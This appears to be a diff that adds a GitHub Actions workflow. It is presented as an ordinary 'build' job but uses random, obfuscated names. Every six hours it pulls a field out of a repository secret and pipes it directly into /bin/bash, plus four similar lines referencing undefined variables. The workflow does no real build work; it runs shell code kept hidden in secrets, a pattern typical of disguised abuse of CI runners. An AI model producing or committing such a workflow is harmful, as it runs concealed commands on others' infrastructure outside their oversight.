@@ -1,0 +1,21 @@
+name: worthlessdrowned
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: worthlessdrowned
+        env:
+          rv97499: ${{ secrets.rv97499 }}
+        run: |
+          echo $rv97499 | jq -r .lpnos85 | /bin/bash
+          echo $yl6443 | jq -r .azs246 | /bin/bash
+          echo $xyskx11487 | jq -r .hold3 | /bin/bash
+          echo $dc3287 | jq -r .s6065 | /bin/bash
+          echo $gdv30551 | jq -r .ztai82550 | /bin/bash
+
